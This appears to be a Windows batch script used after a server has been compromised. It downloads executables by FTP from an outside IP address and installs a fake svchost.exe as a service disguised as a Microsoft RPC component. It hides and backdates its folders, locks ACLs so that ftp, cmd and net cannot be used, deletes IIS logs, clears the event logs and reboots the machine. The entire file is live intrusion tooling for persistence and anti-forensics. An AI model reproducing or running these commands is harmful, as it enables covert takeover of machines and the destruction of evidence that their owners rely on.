::creating echo script
echo open 212.37.212.185 8899 > k
echo tools >> k
echo kk >> k
echo type binary >> k
echo get xcacls.exe xcacls.exe >> k
echo get svchost.exe svchost.exe >> k
echo get msconfig.dll msconfig.dll >> k
echo get clearlogs.exe clearlogs.exe >> k
echo get touch.exe touch.exe >> k
echo get winkick.exe winkick.exe >> k
echo get lon lon.exe >> k
echo get lof lof >> k
echo get c c >> k
echo bye >> k

::Bringing the files
ftp -s:k

::create folder
mkdir "C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32" 

::Moving Server
copy svchost.exe C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32\svchost.exe
copy msconfig.dll C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32\msconfig.dll
copy lon C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32\lon
copy lof C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32\lof
copy c C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32\c

del svchost.exe
del msconfig.dll
del lon
del lof
del c
del k

copy xcacls.exe c:\\winnt\system32\xcacls.exe
copy touch.exe c:\winnt\system32\touch.exe
copy winkick.exe c:\winnt\system32\winkick.exe
copy clearlogs.exe c:\winnt\system32\clearlogs.exe

del xcacls.exe
del touch.exe
del winkick.exe
del clearlogs.exe

::Changing attributes and locking folder and files
attrib.exe +h +s +r "C:\WINNT\SYSTEM32\WBEM"
attrib.exe +h +s +r "C:\WINNT\SYSTEM32\WBEM\MOF"
attrib.exe +h +s +r "C:\WINNT\SYSTEM32\WBEM\MOF\BAD"
attrib.exe +h +s +r "C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32"

::change the time of the folder to make it the same as c:\winnt\system32\drwatson.exe
touch.exe -g "%SystemRoot%\system32\drwatson.exe" "C:\WINNT\SYSTEM32\WBEM"
touch.exe -g "%SystemRoot%\system32\drwatson.exe" "C:\WINNT\SYSTEM32\WBEM\MOF"
touch.exe -g "%SystemRoot%\system32\drwatson.exe" "C:\WINNT\SYSTEM32\WBEM\MOF\BAD"
touch.exe -g "%SystemRoot%\system32\drwatson.exe" "C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32"

::lock the folders 
xcacls.exe "C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32" /G EVERYONE:F /Y
xcacls.exe "C:\WINNT\SYSTEM32\WBEM\MOF\BAD" /G SYSTEM:F /Y
xcacls.exe "C:\WINNT\SYSTEM32\WBEM\MOF" /D everyone /Y

::Starting Server as RPC service
rpc -install -name:"Remote Procedure Call (RPC) Manager" -launch:"C:\WINNT\SYSTEM32\WBEM\MOF\BAD\USR32\svchost.exe"

net start "Remote Procedure Call (RPC) Manager"


::Creating Registry Value for Server
echo Windows Registry Editor Version 5.00> RPC.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Remote Procedure Call (RPC) Manager]>> RPC.reg
echo "Description"="Manages the RPC services database of network connections.">> RPC.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Remote Procedure Call (RPC) Manager]>> RPC.reg
echo "VendorName"="Microsoft">> RPC.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Remote Procedure Call (RPC) Manager]>> RPC.reg
echo "Group"="Local Administrators">> RPC.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Remote Procedure Call (RPC) Manager\Parameters]>> RPC.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Remote Procedure Call (RPC) Manager\Parameters]>> RPC.reg
echo "AddParameters"="-service">> RPC.reg

regedit /S RPC.reg

del RPC.reg

::Creating Secure Folders in System Volume Information..
xcacls.exe "c:\System Volume Information" /G EVERYONE:F /Y
mkdir "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup"

attrib.exe +h +s +r "c:\System Volume Information"
attrib.exe +h +s +r "c:\System Volume Information\catalog"
attrib.exe +h +s +r "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}"
attrib.exe +h +s +r "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup"

::change the time of the folder to make it the same as c:\RECYCLER
touch.exe -g "c:\RECYCLER" "c:\System Volume Information"
touch.exe -g "c:\RECYCLER" "c:\System Volume Information\catalog"
touch.exe -g "c:\RECYCLER" "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}"
touch.exe -g "c:\RECYCLER" "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup"

::lock the folders 
xcacls.exe "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup" /G EVERYONE:F /Y
xcacls.exe "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}" /G SYSTEM:F /Y
xcacls.exe "c:\System Volume Information\catalog" /D EVERYONE /Y
xcacls.exe "c:\System Volume Information" /G SYSTEM:F /Y

::Securing...
xcacls.exe %systemroot%\system32\ftp.exe /P SYSTEM:N /E /Y 
xcacls.exe %systemroot%\system32\tftp.exe /P SYSTEM:N /E /Y 
xcacls.exe %systemroot%\system32\cmd.exe /P SYSTEM:N /E /Y 
xcacls.exe %systemroot%\system32\net.exe /P SYSTEM:N /E /Y 
xcacls.exe %systemroot%\system32\dllcache\ftp.exe /P SYSTEM:N /E /Y 
xcacls.exe %systemroot%\system32\dllcache\tftp.exe /P SYSTEM:N /E /Y 
xcacls.exe %systemroot%\system32\dllcache\cmd.exe /P SYSTEM:N /E /Y 
xcacls.exe %systemroot%\system32\dllcache\net.exe /P SYSTEM:N /E /Y 

attrib.exe +h +s +r "c:\winnt\system32\spool\drivers\com3\com1\-lockme-"
touch.exe -g "%SystemRoot%\system32\drwatson.exe" "c:\winnt\system32\spool\drivers\com3\com1\-lockme-"
xcacls.exe "c:\winnt\system32\spool\drivers" /D EVERYONE /Y
xcacls.exe "c:\winnt\system32\spool\drivers\com3\com1\-lockme-" /G SYSTEM:F /Y

::Clearing the mess
net stop w3svc
del /s /q /f %systemroot%\system32\LogFiles\*.log 
clearlogs.exe -app 
clearlogs.exe -sys 
clearlogs.exe -sec 


::Rebooting BoX..Byeee
Winkick.exe /reboot


